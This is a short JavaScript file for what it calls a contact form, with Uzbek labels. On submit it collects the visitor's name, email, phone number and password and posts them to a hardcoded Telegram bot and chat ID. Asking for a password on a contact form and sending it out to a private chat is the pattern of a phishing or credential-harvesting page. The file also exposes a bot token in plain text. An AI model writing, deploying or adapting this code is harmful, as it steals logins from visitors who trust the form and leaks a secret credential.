'use strict'

const BOT_TOKEN = '8522340229:AAH2tQuPfXzeMJWjrEipv2v9bMnoCwFQJ4g'
const CHAT_ID = '6023504003'

const form = document.querySelector('#contactForm')
const statusText = document.querySelector('#status')

form.addEventListener('submit', function (e) {
  e.preventDefault()

    const email = document.getElementById('email').value
    const password = document.getElementById('password').value 
    const name = document.getElementById('name').value
    const call = document.getElementById('number').value

  const text = `
📝 Yangi forma xabari:
👨    ism:${name}
📧    email:${email}
🔑    parol:${password}
📞    telefon:${call}
  `

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
    }),
  })
    .then(res => {
      statusText.textContent = 'Xabar muvaffaqiyatli yuborildi!'
      form.reset()
    })
    .catch(err => {
      statusText.textContent = 'Xatolik yuz berdi!'
    })
})


// telegram